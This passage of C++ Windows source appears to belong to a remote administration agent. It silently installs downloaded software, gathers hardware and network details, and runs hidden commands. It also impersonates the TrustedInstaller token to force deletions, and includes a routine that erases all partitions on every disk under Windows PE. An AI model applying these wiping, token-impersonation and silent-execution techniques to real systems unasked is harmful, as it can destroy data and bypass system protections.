            string msg(buf);
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(msg.begin(), msg.end()));
        }

        return;
    }

    wstring wsavePath = Utf8ToWide(savePath);

    if (cfg.silentArgs == "!") {
        // 情况二：直接运行，不带任何参数，不等待退出

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOWNORMAL;  // 正常显示窗口
        PROCESS_INFORMATION pi = {};
        wstring cmdLine2 = L"\"" + wsavePath + L"\"";

        if (!CreateProcessW(wsavePath.c_str(), &cmdLine2[0],
            NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            DWORD err = GetLastError();
            if (cfg.reportSocket != INVALID_SOCKET) {
                char buf[256] = {};
                sprintf_s(buf, "RUN_FAIL|%s|%lu|%s", filename.c_str(), err, cpuTag.c_str());
                string msg(buf);
                SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                    vector<char>(msg.begin(), msg.end()));
            }
            return;
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // 回报启动成功
        if (cfg.reportSocket != INVALID_SOCKET) {
            char buf[256] = {};
            sprintf_s(buf, "RUN_OK|%s|%s", filename.c_str(), cpuTag.c_str());
            string msg(buf);
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(msg.begin(), msg.end()));
        }
        // 同时补发DONE
        SendDownloadProgress(cfg.reportSocket, filename, total, total, 0, true, savePath, cpuTag);
        return;
    }

    // 情况三：带静默参数，安装并等待退出
    wstring wargs = Utf8ToWide(cfg.silentArgs);
    wstring cmdLine = L"\"" + wsavePath + L"\" " + wargs;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessW(wsavePath.c_str(), &cmdLine[0],
        NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        string err = "ERROR:启动失败:" + to_string(GetLastError());
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(err.begin(), err.end()));
        return;
    }

    if (cfg.reportSocket != INVALID_SOCKET) {
        char buf[512] = {};
        sprintf_s(buf, "INSTALL_START|%s|%s", filename.c_str(), cpuTag.c_str());
        string msg(buf);
        SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
            vector<char>(msg.begin(), msg.end()));
    }

    DWORD waitResult = WaitForSingleObject(pi.hProcess, 30 * 60 * 1000);
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (waitResult == WAIT_TIMEOUT) {
        string err = "INSTALL_TIMEOUT|" + filename + "|" + cpuTag;
        if (cfg.reportSocket != INVALID_SOCKET)
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(err.begin(), err.end()));
        return;
    }

    if (exitCode == 0 || exitCode == 3010) {
        string rebootHint = (exitCode == 3010) ? "（需要重启生效）" : "";
        if (cfg.reportSocket != INVALID_SOCKET) {
            char buf[512] = {};
            sprintf_s(buf, "INSTALL_DONE|%s|%lu|%s|%s",
                filename.c_str(), exitCode, rebootHint.c_str(), cpuTag.c_str());
            string msg(buf);
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(msg.begin(), msg.end()));
        }
        // 安装完成后自动启动（用于连连控等安装后不自动打开的软件）
        if (cfg.launchAfterInstall) {
            Sleep(2000);  // 等安装程序完全退出，文件写入完毕
            LaunchAskLink(cfg.reportSocket, cpuTag);
        }
    }

    else {
        if (cfg.reportSocket != INVALID_SOCKET) {
            char buf[512] = {};
            sprintf_s(buf, "INSTALL_FAIL|%s|%lu|%s",
                filename.c_str(), exitCode, cpuTag.c_str());
            string msg(buf);
            SendPacketBin(cfg.reportSocket, CMD_DOWNLOAD_PROGRESS,
                vector<char>(msg.begin(), msg.end()));
        }
    }

    SendDownloadProgress(cfg.reportSocket, filename, total, total, 0, true, savePath, cpuTag);
}


//获取进程列表
string GetProcessList()
{
    string result;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap == INVALID_HANDLE_VALUE)
        return "ERROR: CreateToolhelp32Snapshot failed\n";

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnap, &pe))
    {
        do
        {
            string nameUtf8 = WideToUtf8(pe.szExeFile);

            char line[512];
            sprintf_s(line, sizeof(line), "%u,%s\n", pe.th32ProcessID, nameUtf8.c_str());

            result += line;

        } while (Process32NextW(hSnap, &pe));
    }

    CloseHandle(hSnap);

    return result;
}

// 判断盘符对应的磁盘是否是SSD
// 返回 true=SSD, false=HDD 或无法判断
bool IsDriveSSD(char driveLetter)
{
    // 1. 先通过盘符找到对应的物理磁盘编号
    char volumePath[32];
    sprintf_s(volumePath, "\\\\.\\%c:", driveLetter);

    HANDLE hVol = CreateFileA(
        volumePath,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hVol == INVALID_HANDLE_VALUE)
        return false;

    // 获取磁盘编号
    STORAGE_DEVICE_NUMBER sdn = {};
    DWORD bytesRet = 0;
    if (!DeviceIoControl(hVol, IOCTL_STORAGE_GET_DEVICE_NUMBER,
        NULL, 0, &sdn, sizeof(sdn), &bytesRet, NULL))
    {
        CloseHandle(hVol);
        return false;
    }
    CloseHandle(hVol);

    // 2. 打开对应的物理磁盘
    char diskPath[32];
    sprintf_s(diskPath, "\\\\.\\PhysicalDrive%u", sdn.DeviceNumber);

    HANDLE hDisk = CreateFileA(
        diskPath,
        0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hDisk == INVALID_HANDLE_VALUE)
        return false;

    // 3. 查询是否有寻道惩罚（SSD无寻道惩罚）
    STORAGE_PROPERTY_QUERY spq = {};
    spq.PropertyId = StorageDeviceSeekPenaltyProperty;
    spq.QueryType = PropertyStandardQuery;

    DEVICE_SEEK_PENALTY_DESCRIPTOR dspd = {};
    bytesRet = 0;

    bool isSSD = false;

    if (DeviceIoControl(hDisk, IOCTL_STORAGE_QUERY_PROPERTY,
        &spq, sizeof(spq),
        &dspd, sizeof(dspd),
        &bytesRet, NULL))
    {
        isSSD = !dspd.IncursSeekPenalty;
    }

    CloseHandle(hDisk);
    return isSSD;
}

//硬盘获取请求，防止硬盘或者分区失效，读取慢。
// 磁盘查询线程参数
struct DiskThreadParam {
    char   letter;
    string result; // 输出：如 "SSD[C:119G]|" 或空
};

DWORD WINAPI DiskQueryThread(LPVOID param)
{
    DiskThreadParam* p = (DiskThreadParam*)param;
    char letter = p->letter;
    string rootPath = string(1, letter) + ":\\";

    UINT driveType = GetDriveTypeA(rootPath.c_str());

    const char* typeStr = nullptr;
    if (driveType == DRIVE_FIXED)     typeStr = IsDriveSSD(letter) ? "SSD" : "HDD";
    else if (driveType == DRIVE_REMOVABLE) typeStr = "USB";
    else if (driveType == DRIVE_REMOTE)    typeStr = "NET";
    else if (driveType == DRIVE_CDROM)     typeStr = "CD";
    else return 0; // 不认识的类型直接跳过

    ULARGE_INTEGER totalBytes = {};
    if (!GetDiskFreeSpaceExA(rootPath.c_str(), nullptr, &totalBytes, nullptr))
        return 0; // 访问失败跳过

    char diskBuf[64] = {};
    ULONGLONG gb = totalBytes.QuadPart / 1024 / 1024 / 1024;
    ULONGLONG mb = totalBytes.QuadPart / 1024 / 1024 % 1024;

    if (gb > 0)
        sprintf_s(diskBuf, "%s[%c:%lluG]|", typeStr, letter, gb);
    else
        sprintf_s(diskBuf, "%s[%c:%lluM]|", typeStr, letter, mb);

    p->result = diskBuf;
    return 0;
}

//获取外网ip,防止卡顿
// 线程参数结构
struct WanThreadParam {
    const char* url;
    bool        isHttps;
    int         port;
    string      result;
};

// 线程函数，单次请求
DWORD WINAPI WanFetchThread(LPVOID param)
{
    WanThreadParam* p = (WanThreadParam*)param;

    DWORD timeout = 5000;

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    if (!hSession) return 0;

    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    string url = p->url;
    string tmp = p->isHttps ? url.substr(8) : url.substr(7);

    string host, path;
    size_t slash = tmp.find('/');
    if (slash == string::npos) { host = tmp; path = "/"; }
    else { host = tmp.substr(0, slash); path = tmp.substr(slash); }

    wstring whost(host.begin(), host.end());
    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), (INTERNET_PORT)p->port, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }

    wstring wpath(path.begin(), path.end());
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET", wpath.c_str(),
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        p->isHttps ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    if (p->isHttps) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }

    bool ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0)
        && WinHttpReceiveResponse(hRequest, NULL);

    if (ok)
    {
        DWORD status = 0, sz = sizeof(status);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &status, &sz, NULL);

        if (status == 200)
        {
            char buf[512] = {};
            DWORD bytesRead = 0;
            while (WinHttpReadData(hRequest, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0)
            {
                p->result.append(buf, bytesRead);
                bytesRead = 0;
            }
            while (!p->result.empty() &&
                (p->result.back() == '\n' || p->result.back() == '\r' || p->result.back() == ' '))
                p->result.pop_back();
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}

string GetPublicIP()
{
    struct ApiInfo { const char* url; bool isHttps; int port; };

    ApiInfo apis[] = {
        { "http://myip.ipip.net",   false, 80  },
        { "https://api.ip.sb/ip",   true,  443 },
        { "http://4.icanhazip.com", false, 80  },
    };

    for (auto& api : apis)
    {
        WanThreadParam param;
        param.url = api.url;
        param.isHttps = api.isHttps;
        param.port = api.port;
        param.result = "";

        // 起一个线程去请求
        HANDLE hThread = CreateThread(NULL, 0, WanFetchThread, &param, 0, NULL);
        if (!hThread) continue;

        // 最多等6秒，超时直接杀线程
        DWORD waitRet = WaitForSingleObject(hThread, 6000);
        if (waitRet == WAIT_TIMEOUT)
        {
            TerminateThread(hThread, 0); // 超时强制结束
            CloseHandle(hThread);
            continue;
        }

        CloseHandle(hThread);

        if (!param.result.empty())
            return param.result;
    }

    return "unknown";
}

// 获取第一块网卡的MAC地址，格式与注册包一致，供中转握手使用
string GetMacForRelay()
{
    IP_ADAPTER_INFO adapterInfo[32];
    DWORD bufLen = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &bufLen) != ERROR_SUCCESS)
        return "00:00:00:00:00:00";

    // ★ 第一优先：有真实IP的以太网或无线网卡
    PIP_ADAPTER_INFO adapter = adapterInfo;
    while (adapter) {
        if (adapter->Type == MIB_IF_TYPE_ETHERNET ||
            adapter->Type == IF_TYPE_IEEE80211) {
            string ip = adapter->IpAddressList.IpAddress.String;
            if (ip != "0.0.0.0") {  // ★ 必须有真实IP
                char mac[32];
                sprintf_s(mac, "%02X-%02X-%02X-%02X-%02X-%02X",
                    adapter->Address[0], adapter->Address[1],
                    adapter->Address[2], adapter->Address[3],
                    adapter->Address[4], adapter->Address[5]);
                return string(mac);
            }
        }
        adapter = adapter->Next;
    }

    // ★ 兜底：取第一块以太网或无线网卡（不管有没有IP）
    adapter = adapterInfo;
    while (adapter) {
        if (adapter->Type == MIB_IF_TYPE_ETHERNET ||
            adapter->Type == IF_TYPE_IEEE80211) {
            char mac[32];
            sprintf_s(mac, "%02X-%02X-%02X-%02X-%02X-%02X",
                adapter->Address[0], adapter->Address[1],
                adapter->Address[2], adapter->Address[3],
                adapter->Address[4], adapter->Address[5]);
            return string(mac);
        }
        adapter = adapter->Next;
    }
    return "00:00:00:00:00:00";
}
//判断pe环境
bool IsRunningInPE()
{
    // 方法1：检测注册表 MiniNT 键（PE 独有）
    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\MiniNT",
        0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return true;
    }

    // 方法2：系统盘符是 X:（PE 惯例）
    wchar_t winDir[MAX_PATH] = {};
    GetWindowsDirectoryW(winDir, MAX_PATH);
    if (winDir[0] == L'X' || winDir[0] == L'x')
        return true;

    return false;
}

// 静默执行命令并返回输出，不弹黑框
string ExecHidden(const char* cmd)
{
    string result;

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return result;

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi = {};
    char cmdBuf[512];
    strcpy_s(cmdBuf, cmd);

    if (!CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return result;
    }

    CloseHandle(hWritePipe);

    // 读取原始字节
    vector<char> rawBytes;
    char buf[4096];
    DWORD bytesRead = 0;
    while (ReadFile(hReadPipe, buf, sizeof(buf), &bytesRead, NULL) && bytesRead > 0)
        rawBytes.insert(rawBytes.end(), buf, buf + bytesRead);

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (rawBytes.empty()) return result;

    // ★ 判断是否是 UTF-16 LE（BOM: FF FE）
    if (rawBytes.size() >= 2 &&
        (unsigned char)rawBytes[0] == 0xFF &&
        (unsigned char)rawBytes[1] == 0xFE)
    {
        // UTF-16 LE → UTF-8
        wstring ws((wchar_t*)(rawBytes.data() + 2),
            (rawBytes.size() - 2) / sizeof(wchar_t));
        result = WideToUtf8(ws);
    }
    else
    {
        // 已经是UTF-8或ASCII，直接用
        result.assign(rawBytes.begin(), rawBytes.end());
    }

    return result;
}

//获取硬件信息
string GetHardwareInfo() {
    string info;

    // 处理器型号
    wchar_t cpuName[256] = {};
    DWORD sz = sizeof(cpuName);
    RegGetValueW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        L"ProcessorNameString",
        RRF_RT_REG_SZ,
        NULL,
        cpuName,
        &sz);
    info += "CPU:" + WideToUtf8(wstring(cpuName)) + "|";

    // 内存大小
    MEMORYSTATUSEX mem = {};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);

    char memBuf[64];

    // 如果大于等于1GB，用GB显示，否则用MB显示
    if (mem.ullTotalPhys >= 1024ULL * 1024 * 1024)
    {
        sprintf_s(memBuf, "%.2f GB", mem.ullTotalPhys / 1024.0 / 1024 / 1024);
    }
    else
    {
        sprintf_s(memBuf, "%llu MB", mem.ullTotalPhys / 1024 / 1024);
    }

    info += "MEM:" + string(memBuf) + "|";

    // 获取所有物理磁盘大小
    // 获取所有磁盘，每个盘最多等6秒，卡住直接跳过
    DWORD drives = GetLogicalDrives();
    for (int i = 0; i < 26; i++)
    {
        if (!(drives & (1 << i)))
            continue;

        char letter = 'A' + i;

        DiskThreadParam param;
        param.letter = letter;
        param.result = "";

        HANDLE hThread = CreateThread(NULL, 0, DiskQueryThread, &param, 0, NULL);
        if (!hThread)
        {
            // 线程创建失败，跳过
            continue;
        }

        DWORD waitRet = WaitForSingleObject(hThread, 6000);
        if (waitRet == WAIT_TIMEOUT)
        {
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            // 超时的盘显示为未知
            char diskBuf[32] = {};
            sprintf_s(diskBuf, "DISK[%c:unknown]|", letter);
            info += diskBuf;
            continue;
        }

        CloseHandle(hThread);

        if (!param.result.empty())
            info += param.result;
    }

    // 网卡信息（IP + MAC，有线和无线都列出）
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG bufLen = sizeof(IP_ADAPTER_INFO);

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (PIP_ADAPTER_INFO)malloc(bufLen);
    }

    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {

            // 只保留以太网和无线
            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET ||
                pAdapter->Type == IF_TYPE_IEEE80211)
            {
                string desc = pAdapter->Description;

                // 转小写方便匹配
                string descLower = desc;
                transform(descLower.begin(), descLower.end(), descLower.begin(), ::tolower);

                // 过滤虚拟网卡
                if (descLower.find("vmware") != string::npos ||
                    descLower.find("virtualbox") != string::npos ||
                    descLower.find("hyper-v") != string::npos ||
                    descLower.find("bluetooth") != string::npos ||
                    descLower.find("wi-fi direct") != string::npos ||
                    descLower.find("tap") != string::npos ||
                    descLower.find("vpn") != string::npos ||
                    descLower.find("loopback") != string::npos ||
                    descLower.find("virtual") != string::npos)
                {
                    pAdapter = pAdapter->Next;
                    continue;
                }

                // IP地址
                string ip = pAdapter->IpAddressList.IpAddress.String;

                // 过滤没有IP的
                if (ip == "0.0.0.0")
                {
                    pAdapter = pAdapter->Next;
                    continue;
                }

                // MAC地址
                char macBuf[32] = {};
                sprintf_s(macBuf, "%02X-%02X-%02X-%02X-%02X-%02X",
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5]);

                // 网卡类型
                const char* nicType = (pAdapter->Type == IF_TYPE_IEEE80211) ? "WIFI" : "ETH";

                char nicBuf[256] = {};
                sprintf_s(nicBuf, "%s[%s IP:%s MAC:%s]",
                    nicType,
                    pAdapter->Description,
                    ip.c_str(),
                    macBuf);

                info += string(nicBuf) + "|";
            }

            pAdapter = pAdapter->Next;
        }
    }

    if (pAdapterInfo) free(pAdapterInfo);

    //
    string publicIP = GetPublicIP();
    info += "WAN:" + publicIP + "|";

    // ===== 主板信息（PE下跳过）=====
    if (!IsRunningInPE())
    {
        HKEY hk;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"HARDWARE\\DESCRIPTION\\System\\BIOS",
            0, KEY_READ, &hk) == ERROR_SUCCESS)
        {
            wchar_t val[256] = {};
            DWORD sz = sizeof(val);
            string boardMfr, boardProduct;

            sz = sizeof(val);
            if (RegQueryValueExW(hk, L"BaseBoardManufacturer",
                NULL, NULL, (LPBYTE)val, &sz) == ERROR_SUCCESS)
                boardMfr = WideToUtf8(wstring(val));

            sz = sizeof(val);
            if (RegQueryValueExW(hk, L"BaseBoardProduct",
                NULL, NULL, (LPBYTE)val, &sz) == ERROR_SUCCESS)
                boardProduct = WideToUtf8(wstring(val));

            RegCloseKey(hk);

            if (!boardMfr.empty() || !boardProduct.empty())
                info += "BOARD:" + boardMfr + "-" + boardProduct + "|";
        }
    }
    // 机器名
    wstring wname(256, 0);
    DWORD mnSz = 256;
    GetComputerNameW(&wname[0], &mnSz);
    wname.resize(mnSz);
    info += "HOST:" + WideToUtf8(wname);
    return info;
}

// 判断当前是否运行在 PE 环境
// 依据：PE 系统盘符通常是 X:，且 X:\Windows\System32\winpe.key 存在
// 或者检测 HKLM\SYSTEM\CurrentControlSet\Control\MiniNT 注册表键

//删除文件和目录相关

static bool TI_EnablePrivilege(HANDLE hToken, LPCWSTR lpPrivilege)
{
    TOKEN_PRIVILEGES tp;
    ZeroMemory(&tp, sizeof(tp));
    LUID luid;
    ZeroMemory(&luid, sizeof(luid));
    if (!LookupPrivilegeValueW(NULL, lpPrivilege, &luid)) return false;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    return (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
}

static void TI_EnableRequiredPrivileges()
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return;
    TI_EnablePrivilege(hToken, L"SeDebugPrivilege");
    TI_EnablePrivilege(hToken, L"SeImpersonatePrivilege");
    TI_EnablePrivilege(hToken, L"SeTakeOwnershipPrivilege");
    TI_EnablePrivilege(hToken, L"SeRestorePrivilege");
    TI_EnablePrivilege(hToken, L"SeBackupPrivilege");
    CloseHandle(hToken);
}

static bool TI_GetTrustedInstallerToken(HANDLE& hToken)
{
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, L"TrustedInstaller",
        SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) { CloseServiceHandle(hScm); return false; }

    SERVICE_STATUS_PROCESS ssp;
    ZeroMemory(&ssp, sizeof(ssp));
    DWORD needed = 0;
    QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
        (LPBYTE)&ssp, sizeof(ssp), &needed);

    if (ssp.dwCurrentState != SERVICE_RUNNING) {
        StartServiceW(hSvc, 0, NULL);
        for (int i = 0; i < 50; i++) {
            Sleep(100);
            QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                (LPBYTE)&ssp, sizeof(ssp), &needed);
            if (ssp.dwCurrentState == SERVICE_RUNNING) break;
        }
    }
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);

    if (ssp.dwProcessId == 0) return false;

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ssp.dwProcessId);
    if (!hProc) return false;

    HANDLE hProcToken = NULL;
    bool ok = OpenProcessToken(hProc,
        TOKEN_DUPLICATE | TOKEN_QUERY, &hProcToken) == TRUE;
    CloseHandle(hProc);
    if (!ok) return false;

    ok = DuplicateTokenEx(hProcToken, TOKEN_ALL_ACCESS, NULL,
        SecurityImpersonation, TokenPrimary, &hToken) == TRUE;
    CloseHandle(hProcToken);
    return ok;
}

static void TI_ResetAcl(const wstring& path)
{
    PSECURITY_DESCRIPTOR pSD = NULL;
    ConvertStringSecurityDescriptorToSecurityDescriptorW(
        L"D:PAI(A;OICI;FA;;;BA)", SDDL_REVISION_1, &pSD, NULL);
    if (pSD) {
        SetFileSecurityW(path.c_str(),
            DACL_SECURITY_INFORMATION | OWNER_SECURITY_INFORMATION, pSD);
        LocalFree(pSD);
    }
    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
}

static bool TI_RunAsTI(const wstring& cmd)
{
    TI_EnableRequiredPrivileges();
    HANDLE hToken = NULL;
    if (!TI_GetTrustedInstallerToken(hToken)) return false;

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    wstring cmdBuf = cmd;
    BOOL ok = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE,
        NULL, &cmdBuf[0], CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hToken);
    if (!ok) return false;

    WaitForSingleObject(pi.hProcess, 60000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static bool TI_ForceDeleteFile(const wstring& path)
{
    TI_ResetAcl(path);
    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    if (DeleteFileW(path.c_str())) return true;
    return TI_RunAsTI(L"cmd.exe /c del /f /q \"" + path + L"\"");
}

static bool TI_ForceDeleteDir(const wstring& path)
{
    TI_ResetAcl(path);
    // 递归重置子项ACL
    wstring searchPath = path + L"\\*";
    WIN32_FIND_DATAW ffd;
    ZeroMemory(&ffd, sizeof(ffd));
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            wstring name = ffd.cFileName;
            if (name == L"." || name == L"..") continue;
            wstring full = path + L"\\" + name;
            TI_ResetAcl(full);
        } while (FindNextFileW(hFind, &ffd));
        FindClose(hFind);
    }
    if (RemoveDirectoryW(path.c_str())) return true;
    return TI_RunAsTI(L"cmd.exe /c rd /s /q \"" + path + L"\"");
}
// ===== TrustedInstaller权限删除 END =====
bool DeleteDirectory(const wstring& path)
{
    wstring searchPath = path + L"\\*";

    WIN32_FIND_DATAW ffd;

    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE)
        return false;

    do
    {
        wstring name = ffd.cFileName;

        if (name == L"." || name == L"..")
            continue;

        wstring fullPath = path + L"\\" + name;

        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            DeleteDirectory(fullPath);
        }
        else
        {
            SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
            DeleteFileW(fullPath.c_str());
        }

    } while (FindNextFileW(hFind, &ffd));

    FindClose(hFind);

    SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);

    return RemoveDirectoryW(path.c_str());
}
// PE 环境下删除所有物理磁盘的所有分区
// 从最后一个盘符往前遍历，每个磁盘单独生成 diskpart 脚本
// 超过 timeout_ms 毫秒未完成则跳过该磁盘
string FormatAllDisksInPE(SOCKET reportSocket, int timeout_ms = 15000)
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    auto Report = [&](const string& msg) {
        if (reportSocket != INVALID_SOCKET)
            SendPacketBin(reportSocket, CMD_FORMAT_RES,
                vector<char>(msg.begin(), msg.end()));
    };

    if (!IsRunningInPE()) {
        string err = "ERROR|非PE环境，禁止执行分区删除操作|" + cpuTag;
        Report(err);
        return err;
    }

    Report("INFO|PE环境确认，开始扫描所有物理磁盘|" + cpuTag);

    set<DWORD> skipDiskNums;
    wchar_t winDir[MAX_PATH] = {};
    GetWindowsDirectoryW(winDir, MAX_PATH);

    auto GetPhysicalDiskNumForDrive = [](char letter) -> int {
        char path[32];
        sprintf_s(path, "\\\\.\\%c:", letter);
        HANDLE hVol = CreateFileA(path, 0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hVol == INVALID_HANDLE_VALUE) return -1;
        STORAGE_DEVICE_NUMBER sdn = {};
        DWORD bytesRet = 0;
        int num = -1;
        if (DeviceIoControl(hVol, IOCTL_STORAGE_GET_DEVICE_NUMBER,
            NULL, 0, &sdn, sizeof(sdn), &bytesRet, NULL))
            num = (int)sdn.DeviceNumber;
        CloseHandle(hVol);
        return num;
    };

    {
        if (wcslen(winDir) >= 2) {
            char peLetter = (char)winDir[0];
            int peDiskNum = GetPhysicalDiskNumForDrive(peLetter);
            if (peDiskNum >= 0) {
                skipDiskNums.insert((DWORD)peDiskNum);
                char skipMsg[128];
                sprintf_s(skipMsg, "INFO|PE系统盘 %c: 位于 PhysicalDrive%d，将跳过|%s",
                    peLetter, peDiskNum, cpuTag.c_str());
                Report(string(skipMsg));
            }
        }
        wchar_t exePath[MAX_PATH] = {};
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        if (wcslen(exePath) >= 2) {
            char exeLetter = (char)exePath[0];
            int exeDiskNum = GetPhysicalDiskNumForDrive(exeLetter);
            if (exeDiskNum >= 0 && skipDiskNums.find((DWORD)exeDiskNum) == skipDiskNums.end()) {
